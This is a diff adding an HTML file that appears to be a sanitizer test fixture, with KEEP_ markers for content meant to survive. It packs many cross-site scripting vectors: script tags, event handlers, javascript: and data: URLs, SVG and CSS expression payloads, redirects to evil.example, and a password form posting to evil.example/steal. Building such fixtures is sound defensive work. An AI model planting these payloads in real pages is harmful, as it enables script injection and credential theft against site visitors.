@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+<meta charset="utf-8">
+<title>LEAKED_TITLE</title>
+<base href="https://evil.example/">
+<link rel="stylesheet" href="https://evil.example/x.css">
+<style type="text/css">
+  .KEEP_STYLE_BLOCK { color: #333; font-family: Arial, sans-serif; }
+  table.layout td { padding: 4px; }
+</style>
+<script>alert('SCRIPT_IN_HEAD')</script>
+</head>
+<body onload="alert('ONLOAD')" bgcolor="#ffffff">
+<div id="KEEP_ID" class="KEEP_CLASS" style="KEEP_STYLE: 1px; color: red" onclick="alert('ONCLICK')">Hello</div>
+<script type="text/javascript">document.write('SCRIPT_IN_BODY')</script>
+<img src="x" onerror="alert('ONERROR')" alt="broken">
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" alt="KEEP_DATA_IMAGE">
+<img src="https://cdn.example.com/KEEP_REMOTE.png" width="600" height="100">
+<a href="javascript:alert('JS_HREF')">click me</a>
+<a href="JaVaScRiPt:alert('JS_HREF_MIXED')">click me too</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">DATA_HTML_LINK</a>
+<a href="https://example.com/KEEP_LINK" target="_blank">ok link</a>
+<form action="https://evil.example/steal" method="post">
+  <input type="password" name="pw" value="FORM_INPUT">
+  <button formaction="https://evil.example/btn">Send</button>
+  <textarea>FORM_TEXTAREA</textarea>
+</form>
+<iframe src="https://evil.example/frame">IFRAME_FALLBACK</iframe>
+<object data="https://evil.example/x.swf">OBJECT_FALLBACK</object>
+<embed src="https://evil.example/y.swf">
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('SVG_ONLOAD')"><script>alert('SVG_SCRIPT')</script><text>SVG_TEXT</text></svg>
+<math><mi xlink:href="javascript:alert('MATH')">MATH_TEXT</mi></math>
+<noscript><img src="https://evil.example/NOSCRIPT.png"></noscript>
+<table class="layout" width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#eeeeee" align="center" style="KEEP_TABLE_STYLE: 0">
+  <tr><td valign="top" align="left" width="50%" background="javascript:alert('BG')" onmouseover="alert('OVER')">KEEP_CELL</td>
+  <td colspan="1" style="background-image:url(https://cdn.example.com/bg.png)"><font face="Georgia" color="#123456" size="2">KEEP_FONT</font></td></tr>
+</table>
+<div style="width: expression(alert('EXPR'))">legacy</div>
+<!-- COMMENT_SECRET -->
+</body>
+</html>
